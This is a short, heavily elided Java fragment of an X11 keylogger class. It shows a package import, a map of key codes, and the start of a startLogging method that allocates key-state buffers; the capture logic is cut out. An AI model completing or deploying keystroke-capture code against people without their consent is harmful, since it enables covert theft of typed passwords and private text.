...
import co.uk.baconi.keylogger.framework.impl.AbstractImpl;
...
public final class X11KeyLogger extends AbstractImpl<X11KeyResult> implements KeyLogger {
    ...
    private final Map<Integer, X11Key> keyMap = new HashMap<Integer, X11Key>();
    ...
    public void startLogging() {
        final byte szKey[] = new byte[128];
        final byte szKeyOld[] = new byte[128];
